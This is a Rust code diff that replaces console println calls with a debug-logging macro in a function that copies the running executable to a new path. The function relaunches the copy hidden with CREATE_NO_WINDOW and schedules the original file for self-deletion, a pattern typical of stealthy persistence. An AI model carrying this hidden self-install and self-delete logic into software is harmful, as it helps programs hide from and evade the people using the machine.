@@ -6,6 +6,7 @@ use std::process::Command;
 
 use crate::config::Config;
 use crate::core::exit_patcher::safe_exit;
+use crate::log_debug;
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
@@ -45,22 +46,16 @@ pub fn install_to_path() -> anyhow::Result<()> {
     
     fs::copy(&current_exe, &target_path)?;
 
-    if Config::SHOW_CONSOLE {
-        println!("Installed to: {}", target_path.display());
-    }
+    log_debug!("Installed to: {}", target_path.display());
 
-    if Config::SHOW_CONSOLE {
-        println!("Starting installed exe...");
-    }
+    log_debug!("Starting installed exe...");
 
     Command::new("cmd")
         .args(["/c", "start", "", &target_path.to_string_lossy()])
         .creation_flags(CREATE_NO_WINDOW)
         .spawn()?;
 
-    if Config::SHOW_CONSOLE {
-        println!("Installed exe started, exiting original process...");
-    }
+    log_debug!("Installed exe started, exiting original process...");
 
     // Autodelete original exe if enabled
     let autodelete_config = Config::get_autodelete_config();
@@ -80,9 +75,7 @@ pub fn install_to_path() -> anyhow::Result<()> {
             .creation_flags(CREATE_NO_WINDOW)
             .spawn()?;
         
-        if Config::SHOW_CONSOLE {
-            println!("Autodelete scheduled for original exe");
-        }
+        log_debug!("Autodelete scheduled for original exe");
     }
 
     std::thread::sleep(std::time::Duration::from_millis(500));
